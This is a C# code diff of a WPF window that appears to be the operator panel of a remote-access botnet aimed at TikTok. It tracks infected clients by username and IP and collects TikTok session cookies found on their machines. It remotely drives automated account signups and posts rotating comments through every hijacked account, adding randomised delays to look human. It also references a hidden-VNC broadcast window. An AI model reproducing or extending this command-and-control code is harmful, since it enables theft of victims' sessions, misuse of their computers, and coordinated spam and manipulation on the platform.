@@ -1,100 +1,257 @@
+using System.Collections.ObjectModel;
+using System.ComponentModel;
+using System.Runtime.CompilerServices;
 using System.Windows;
 using System.Windows.Input;
 using Newtonsoft.Json;
+using SeroServer.Data;
 using SeroServer.Net;
 using SeroServer.Protocol;
 
 namespace SeroServer.UI;
 
+// ── ViewModels ────────────────────────────────────────────────────────────────
+
+public class TikTokClientVM : INotifyPropertyChanged
+{
+    public string Id    { get; set; } = "";
+    public string Label { get; set; } = "";
+
+    private bool   _selected = true;
+    private string _status   = "—";
+    private string _cookie   = "";
+
+    public bool Selected
+    {
+        get => _selected;
+        set { _selected = value; OnProp(); }
+    }
+
+    public string Status
+    {
+        get => _status;
+        set { _status = value; OnProp(); }
+    }
+
+    public string Cookie
+    {
+        get => _cookie;
+        set { _cookie = value; OnProp(); OnProp(nameof(CookieShort)); OnProp(nameof(HasCookie)); }
+    }
+
+    public bool   HasCookie   => !string.IsNullOrEmpty(_cookie);
+    public string CookieShort => _cookie.Length > 44 ? _cookie[..44] + "…" : _cookie;
+
+    public event PropertyChangedEventHandler? PropertyChanged;
+    private void OnProp([CallerMemberName] string? n = null)
+        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(n));
+}
+
+// ── Window ────────────────────────────────────────────────────────────────────
+
 public partial class TikTokWindow : Window
 {
     private readonly TlsServer _server;
-    private readonly string    _clientId;
+    private readonly ObservableCollection<TikTokClientVM> _clients = [];
     private bool _maximized;
     private bool _running;
     private int  _sentCount;
     private CancellationTokenSource? _cts;
-    private HvncBroadcastWindow? _broadcastWindow;
 
-    public TikTokWindow(TlsServer server, string clientId, string label)
+    public TikTokWindow(TlsServer server)
     {
         InitializeComponent();
-        _server   = server;
-        _clientId = clientId;
-        TxtTitle.Text = $"  —  {label}";
+        _server = server;
 
-        _server.RegisterHandler(clientId, PacketType.TikTokCommentAck,   OnAck);
-        _server.RegisterHandler(clientId, PacketType.TikTokCookieResult, OnCookieResult);
+        ClientList.ItemsSource  = _clients;
+        GridAccounts.ItemsSource = _clients;
+
+        // Populate from currently connected clients
+        foreach (var c in _server.ConnectedClients.Values)
+            AddClient(c);
+
+        // Track connects/disconnects
+        _server.ClientConnected    += OnClientConnected;
+        _server.ClientDisconnected += OnClientDisconnected;
 
         Closed += (_, _) =>
         {
             _cts?.Cancel();
-            _server.UnregisterHandler(clientId, PacketType.TikTokCommentAck);
-            _server.UnregisterHandler(clientId, PacketType.TikTokCookieResult);
-        };
-
-        RbLive.Checked  += (_, _) => TxtIdLabel.Text = "Livestream room ID or URL";
-        RbVideo.Checked += (_, _) => TxtIdLabel.Text = "Video URL or ID";
-
-        _server.RegisterHandler(clientId, PacketType.CdpSignupStatus, OnCdpStatus);
-        _server.RegisterHandler(clientId, PacketType.CdpSignupResult, OnCdpResult);
-        Closed += (_, _) =>
-        {
-            _server.UnregisterHandler(clientId, PacketType.CdpSignupStatus);
-            _server.UnregisterHandler(clientId, PacketType.CdpSignupResult);
+            _server.ClientConnected    -= OnClientConnected;
+            _server.ClientDisconnected -= OnClientDisconnected;
+            // Unregister all handlers
+            foreach (var vm in _clients)
+                UnregisterHandlers(vm.Id);
         };
     }
 
-    // ── Incoming ────────────────────────────────────────────────────────────
+    // ── Client tracking ──────────────────────────────────────────────────────
 
-    private void OnAck(Packet pkt)
+    private void AddClient(ConnectedClient c)
+    {
+        var label = string.IsNullOrEmpty(c.Tag) ? $"{c.Username}@{c.IP}" : c.Tag;
+        var vm = new TikTokClientVM { Id = c.Id, Label = label };
+        _clients.Add(vm);
+        RegisterHandlers(vm.Id);
+        UpdateAccountCount();
+    }
+
+    private void OnClientConnected(ConnectedClient c)
+        => Dispatcher.BeginInvoke(() => AddClient(c));
+
+    private void OnClientDisconnected(ConnectedClient c)
+        => _ = Dispatcher.BeginInvoke(() =>
+        {
+            var vm = _clients.FirstOrDefault(x => x.Id == c.Id);
+            if (vm == null) return;
+            UnregisterHandlers(vm.Id);
+            _clients.Remove(vm);
+            UpdateAccountCount();
+        });
+
+    private void RegisterHandlers(string id)
+    {
+        _server.RegisterHandler(id, PacketType.TikTokCommentAck,   p => OnCommentAck(id, p));
+        _server.RegisterHandler(id, PacketType.TikTokCookieResult, p => OnCookieResult(id, p));
+        _server.RegisterHandler(id, PacketType.CdpSignupStatus,    p => OnCdpStatus(id, p));
+        _server.RegisterHandler(id, PacketType.CdpSignupResult,    p => OnCdpResult(id, p));
+    }
+
+    private void UnregisterHandlers(string id)
+    {
+        _server.UnregisterHandler(id, PacketType.TikTokCommentAck);
+        _server.UnregisterHandler(id, PacketType.TikTokCookieResult);
+        _server.UnregisterHandler(id, PacketType.CdpSignupStatus);
+        _server.UnregisterHandler(id, PacketType.CdpSignupResult);
+    }
+
+    private void UpdateAccountCount()
+    {
+        var n = _clients.Count(x => x.HasCookie);
+        TxtAccountCount.Text = $"{n} account{(n != 1 ? "s" : "")} / {_clients.Count} client{(_clients.Count != 1 ? "s" : "")}";
+    }
+
+    // ── Incoming packets ─────────────────────────────────────────────────────
+
+    private void OnCommentAck(string id, Packet pkt)
     {
         var d = JsonConvert.DeserializeObject<TikTokCommentAckData>(pkt.Data);
         if (d == null) return;
-        Dispatcher.Invoke(() =>
+        _ = Dispatcher.BeginInvoke(() =>
         {
+            var vm = _clients.FirstOrDefault(x => x.Id == id);
             if (d.Success)
             {
                 _sentCount++;
                 TxtSentCount.Text = $"  {_sentCount} sent";
-                AddLog($"[✓] Posted successfully");
-                TxtStatus.Text = $"{_sentCount} comment(s) sent";
+                AddLog($"[✓] {vm?.Label ?? id[..8]} → posted");
+                TxtProgress.Text = $"{_sentCount} sent";
             }
             else
             {
-                AddLog($"[✗] {d.Error}");
-                TxtStatus.Text = $"Failed — {d.Error[..Math.Min(d.Error.Length, 60)]}";
+                AddLog($"[✗] {vm?.Label ?? id[..8]} → {d.Error}");
             }
         });
     }
 
-    private void OnCookieResult(Packet pkt)
+    private void OnCookieResult(string id, Packet pkt)
     {
         var d = JsonConvert.DeserializeObject<TikTokCookieResultData>(pkt.Data);
         if (d == null) return;
-        Dispatcher.Invoke(() =>
+        _ = Dispatcher.BeginInvoke(() =>
         {
+            var vm = _clients.FirstOrDefault(x => x.Id == id);
+            if (vm == null) return;
             if (d.Found)
             {
-                TxtCookie.Text = d.Cookie;
-                AddLog("[✓] Session found — cookie loaded");
-                TxtStatus.Text = "Session detected and loaded";
+                vm.Cookie = d.Cookie;
+                vm.Status = "✓ session detected";
+                AddLog($"[✓] {vm.Label} — session cookie loaded");
+                UpdateAccountCount();
             }
             else
             {
-                AddLog("[✗] No TikTok session found — paste your cookie manually");
-                TxtStatus.Text = "No session found on this machine";
+                vm.Status = "✗ no session";
+                AddLog($"[✗] {vm.Label} — no TikTok session found");
             }
         });
     }
 
-    // ── Queue runner ─────────────────────────────────────────────────────────
+    private void OnCdpStatus(string id, Packet pkt)
+    {
+        var d = JsonConvert.DeserializeObject<CdpSignupStatusData>(pkt.Data);
+        if (d == null) return;
+        _ = Dispatcher.BeginInvoke(() =>
+        {
+            var vm = _clients.FirstOrDefault(x => x.Id == id);
+            if (vm != null) vm.Status = d.Message;
+            TxtCdpLog.AppendText($"[{vm?.Label ?? id[..8]}] {d.Message}\n");
+            TxtCdpLog.ScrollToEnd();
+        });
+    }
+
+    private void OnCdpResult(string id, Packet pkt)
+    {
+        var d = JsonConvert.DeserializeObject<CdpSignupResultData>(pkt.Data);
+        if (d == null) return;
+        _ = Dispatcher.BeginInvoke(() =>
+        {
+            var vm = _clients.FirstOrDefault(x => x.Id == id);
+            if (vm == null) return;
+            if (d.Success)
+            {
+                vm.Cookie = d.Cookie;
+                vm.Status = string.IsNullOrEmpty(d.Account) ? "✓ account created" : $"✓ {d.Account}";
+                AddLog($"[✓] {vm.Label} — account created" +
+                       (string.IsNullOrEmpty(d.Account) ? "" : $" ({d.Account})"));
+                TxtCdpLog.AppendText($"[✓] {vm.Label} — done\n");
+                UpdateAccountCount();
+            }
+            else
+            {
+                vm.Status = $"✗ {d.Error}";
+                TxtCdpLog.AppendText($"[✗] {vm.Label} — {d.Error}\n");
+                AddLog($"[✗] {vm.Label} — signup failed: {d.Error}");
+            }
+            TxtCdpLog.ScrollToEnd();
+            // Re-enable button if all signups finished
+            if (_clients.All(c => !c.Status.StartsWith("Signing")))
+            {
+                BtnCdpSignup.IsEnabled = true;
+                BtnCdpSignup.Content   = "🤖 Signup Selected";
+            }
+        });
+    }
+
+    // ── CDP Auto-Signup ───────────────────────────────────────────────────────
+
+    private async void BtnCdpSignup_Click(object s, RoutedEventArgs e)
+    {
+        var selected = _clients.Where(c => c.Selected).ToList();
+        if (selected.Count == 0) { TxtStatus.Text = "Select at least one client."; return; }
+
+        BtnCdpSignup.IsEnabled = false;
+        BtnCdpSignup.Content   = $"⏳ Running ({selected.Count})…";
+        TxtCdpLog.Text         = "";
+        TxtStatus.Text         = $"CDP signup running on {selected.Count} client(s)…";
+
+        foreach (var vm in selected)
+        {
+            vm.Status = "Signing up…";
+            await _server.SendToClient(vm.Id, new Packet { Type = PacketType.CdpSignupStart });
+        }
+        // Button re-enabled when all OnCdpResult fire (see OnCdpResult)
+    }
+
+    // ── Comment broadcast ─────────────────────────────────────────────────────
 
     private async void BtnStart_Click(object s, RoutedEventArgs e)
     {
+        var accounts = _clients.Where(c => c.HasCookie).ToList();
+        if (accounts.Count == 0) { TxtStatus.Text = "No accounts with cookies yet — run Auto-Signup first."; return; }
         var comments = GetComments();
         if (comments.Length == 0) { TxtStatus.Text = "Enter at least one comment."; return; }
-        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video/room ID."; return; }
+        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video URL or ID."; return; }
         if (!int.TryParse(TxtDelayMin.Text, out int dMin) || !int.TryParse(TxtDelayMax.Text, out int dMax))
         { TxtStatus.Text = "Invalid delay values."; return; }
         if (dMin > dMax) dMax = dMin;
@@ -102,100 +259,109 @@ public partial class TikTokWindow : Window
         SetRunning(true);
         _cts = new CancellationTokenSource();
         var ct = _cts.Token;
+        var isLive = RbLive.IsChecked == true;
+        var videoId = TxtVideoId.Text.Trim();
 
-        AddLog($"[▶] Starting queue — {comments.Length} comment(s), delay {dMin}-{dMax}s");
+        AddLog($"[▶] {accounts.Count} accounts · {comments.Length} comment(s) · delay {dMin}-{dMax}s");
 
         await Task.Run(async () =>
         {
-            int idx = 0;
+            int pass = 0;
             while (!ct.IsCancellationRequested)
             {
-                string comment = comments[idx % comments.Length];
-                idx++;
-
-                Dispatcher.Invoke(() =>
+                // One pass: each account posts one comment (rotated)
+                for (int i = 0; i < accounts.Count && !ct.IsCancellationRequested; i++)
                 {
-                    TxtBadge.Text = $"POSTING ({idx}/{comments.Length})";
-                    TxtProgress.Text = $"{idx - 1}/{comments.Length}";
-                });
+                    var vm      = accounts[i];
+                    var comment = comments[(pass * accounts.Count + i) % comments.Length];
 
-                await SendComment(comment);
+                    _ = Dispatcher.BeginInvoke(() =>
+                    {
+                        TxtBadge.Text   = $"POSTING ({i + 1}/{accounts.Count})";
+                        TxtProgress.Text = $"Pass {pass + 1}";
+                        TxtStatus.Text   = $"Posting to {vm.Label}…";
+                    });
 
-                // Wait for ACK with 10s timeout
-                await Task.Delay(500, ct);
+                    await _server.SendToClient(vm.Id, new Packet
+                    {
+                        Type = PacketType.TikTokComment,
+                        Data = JsonConvert.SerializeObject(new TikTokCommentData
+                        {
+                            VideoId    = videoId,
+                            Text       = comment,
+                            Cookie     = vm.Cookie,
+                            IsLiveroom = isLive
+                        })
+                    });
 
-                // Human-like delay between posts
-                int delay = Random.Shared.Next(dMin, dMax + 1) * 1000;
-                Dispatcher.Invoke(() => TxtStatus.Text = $"Waiting {delay / 1000}s…");
-                try { await Task.Delay(delay, ct); } catch (OperationCanceledException) { break; }
+                    // Wait for ACK + human delay
+                    int delay = Random.Shared.Next(dMin, dMax + 1) * 1000;
+                    try { await Task.Delay(delay, ct); } catch (OperationCanceledException) { break; }
+                }
 
-                // Stop after one full pass if not looping (only loop if user keeps clicking Start)
-                if (idx >= comments.Length) break;
+                pass++;
+                // Stop after one pass
+                break;
             }
-
-            Dispatcher.Invoke(() => SetRunning(false));
+            _ = Dispatcher.BeginInvoke(() => SetRunning(false));
         }, ct);
 
-        if (!ct.IsCancellationRequested)
-            SetRunning(false);
+        if (!ct.IsCancellationRequested) SetRunning(false);
     }
 
     private void BtnStop_Click(object s, RoutedEventArgs e)
     {
         _cts?.Cancel();
         SetRunning(false);
-        AddLog("[■] Stopped by user");
+        AddLog("[■] Stopped");
     }
 
     private async void BtnPostOnce_Click(object s, RoutedEventArgs e)
     {
+        var accounts = _clients.Where(c => c.HasCookie).ToList();
+        if (accounts.Count == 0) { TxtStatus.Text = "No accounts yet."; return; }
         var comments = GetComments();
         if (comments.Length == 0) { TxtStatus.Text = "Enter a comment."; return; }
-        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video/room ID."; return; }
-        await SendComment(comments[0]);
-        AddLog($"[→] Sending single: {comments[0][..Math.Min(comments[0].Length, 40)]}…");
-        TxtStatus.Text = "Sending…";
-    }
+        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video URL or ID."; return; }
 
-    private async void BtnDetect_Click(object s, RoutedEventArgs e)
-    {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TikTokDetectCookie });
-        TxtStatus.Text = "Detecting session…";
-        AddLog("[?] Looking for TikTok session on machine…");
-    }
+        var isLive  = RbLive.IsChecked == true;
+        var videoId = TxtVideoId.Text.Trim();
+        AddLog($"[→] Single post — {accounts.Count} account(s)");
 
-    // ── Helpers ─────────────────────────────────────────────────────────────
-
-    private async Task SendComment(string text)
-    {
-        await _server.SendToClient(_clientId, new Packet
+        for (int i = 0; i < accounts.Count; i++)
         {
-            Type = PacketType.TikTokComment,
-            Data = JsonConvert.SerializeObject(new TikTokCommentData
+            var vm      = accounts[i];
+            var comment = comments[i % comments.Length];
+            await _server.SendToClient(vm.Id, new Packet
             {
-                VideoId    = TxtVideoId.Text.Trim(),
-                Text       = text,
-                Cookie     = TxtCookie.Text.Trim(),
-                IsLiveroom = RbLive.IsChecked == true
-            })
-        });
+                Type = PacketType.TikTokComment,
+                Data = JsonConvert.SerializeObject(new TikTokCommentData
+                {
+                    VideoId = videoId, Text = comment, Cookie = vm.Cookie, IsLiveroom = isLive
+                })
+            });
+        }
     }
+
+    // ── Helpers ───────────────────────────────────────────────────────────────
+
+    private void BtnSelectAll_Click(object s, RoutedEventArgs e)
+    {
+        foreach (var vm in _clients) vm.Selected = true;
+    }
+
+    private void BtnSelectNone_Click(object s, RoutedEventArgs e)
+    {
+        foreach (var vm in _clients) vm.Selected = false;
+    }
+
+    private void Client_SelectChanged(object s, RoutedEventArgs e) { }
+    private void RbTarget_Changed(object s, RoutedEventArgs e)     { }
 
     private string[] GetComments()
         => TxtComments.Text
             .Split('\n', StringSplitOptions.RemoveEmptyEntries)
-            .Select(l => l.Trim())
-            .Where(l => l.Length > 0)
-            .ToArray();
-
-    private void SetRunning(bool running)
-    {
-        _running = running;
-        BtnStart.IsEnabled = !running; BtnStart.Opacity = running ? 0.4 : 1.0;
-        BtnStop.IsEnabled  =  running; BtnStop.Opacity  = running ? 1.0 : 0.4;
-        BadgeRunning.Visibility = running ? Visibility.Visible : Visibility.Collapsed;
-        if (!running) { TxtBadge.Text = "RUNNING"; TxtProgress.Text = ""; }
-    }
+            .Select(l => l.Trim()).Where(l => l.Length > 0).ToArray();
 
     private void TxtComments_Changed(object s, System.Windows.Controls.TextChangedEventArgs e)
     {
@@ -203,19 +369,34 @@ public partial class TikTokWindow : Window
         TxtQueueCount.Text = $"{n} comment{(n != 1 ? "s" : "")}";
     }
 
-    private void RbTarget_Changed(object s, RoutedEventArgs e) { }
-
-    private void AddLog(string msg)
+    private void BtnClearAccounts_Click(object s, RoutedEventArgs e)
     {
-        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
-        TxtLog.ScrollToEnd();
+        foreach (var vm in _clients) { vm.Cookie = ""; vm.Status = "—"; }
+        UpdateAccountCount();
+        AddLog("[·] Accounts cleared");
     }
 
     private void BtnClearLog_Click(object s, RoutedEventArgs e)
     {
         TxtLog.Clear();
         _sentCount = 0;
-        TxtSentCount.Text = "  0 sent";
+        TxtSentCount.Text = "";
+        TxtProgress.Text  = "";
+    }
+
+    private void SetRunning(bool running)
+    {
+        _running = running;
+        BtnStart.IsEnabled  = !running; BtnStart.Opacity  = running ? 0.4 : 1.0;
+        BtnStop.IsEnabled   =  running; BtnStop.Opacity   = running ? 1.0 : 0.4;
+        BadgeRunning.Visibility = running ? Visibility.Visible : Visibility.Collapsed;
+        if (!running) TxtBadge.Text = "POSTING";
+    }
+
+    private void AddLog(string msg)
+    {
+        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
+        TxtLog.ScrollToEnd();
     }
 
     private void BtnMax_Click(object s, RoutedEventArgs e)
@@ -231,66 +412,6 @@ public partial class TikTokWindow : Window
         if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
             DragMove();
     }
+
     private void Close_Click(object s, RoutedEventArgs e) => Close();
-
-    private void BtnBroadcast_Click(object s, RoutedEventArgs e)
-    {
-        if (_broadcastWindow == null || !_broadcastWindow.IsLoaded)
-        {
-            _broadcastWindow = new HvncBroadcastWindow(_server) { Owner = this };
-            _broadcastWindow.Show();
-        }
-        else
-            _broadcastWindow.Activate();
-    }
-
-    // ── CDP Auto-Signup ─────────────────────────────────────────────────────
-
-    private async void BtnCdpSignup_Click(object s, RoutedEventArgs e)
-    {
-        BtnCdpSignup.IsEnabled = false;
-        BtnCdpSignup.Content   = "⏳ Running...";
-        TxtCdpLog.Text         = "";
-        TxtStatus.Text         = "CDP signup running...";
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.CdpSignupStart });
-    }
-
-    private void OnCdpStatus(Packet pkt)
-    {
-        var d = Newtonsoft.Json.JsonConvert.DeserializeObject<CdpSignupStatusData>(pkt.Data);
-        if (d == null) return;
-        _ = Dispatcher.BeginInvoke(() =>
-        {
-            TxtCdpLog.AppendText($"[·] {d.Message}\n");
-            TxtCdpLog.ScrollToEnd();
-            TxtStatus.Text = d.Message;
-        });
-    }
-
-    private void OnCdpResult(Packet pkt)
-    {
-        var d = Newtonsoft.Json.JsonConvert.DeserializeObject<CdpSignupResultData>(pkt.Data);
-        if (d == null) return;
-        _ = Dispatcher.BeginInvoke(() =>
-        {
-            BtnCdpSignup.IsEnabled = true;
-            BtnCdpSignup.Content   = "🤖 Auto-Signup";
-            if (d.Success)
-            {
-                TxtCdpLog.AppendText($"[✓] Account: {d.Account}\n");
-                if (!string.IsNullOrEmpty(d.Cookie))
-                    TxtCdpLog.AppendText($"[✓] Cookie: {d.Cookie[..Math.Min(d.Cookie.Length, 80)]}...\n");
-                TxtStatus.Text = $"✓ Signup success — {d.Account}";
-                // Auto-fill cookie field if empty
-                if (string.IsNullOrEmpty(TxtCookie.Text) && !string.IsNullOrEmpty(d.Cookie))
-                    TxtCookie.Text = d.Cookie;
-            }
-            else
-            {
-                TxtCdpLog.AppendText($"[✗] {d.Error}\n");
-                TxtStatus.Text = $"✗ {d.Error}";
-            }
-            TxtCdpLog.ScrollToEnd();
-        });
-    }
 }
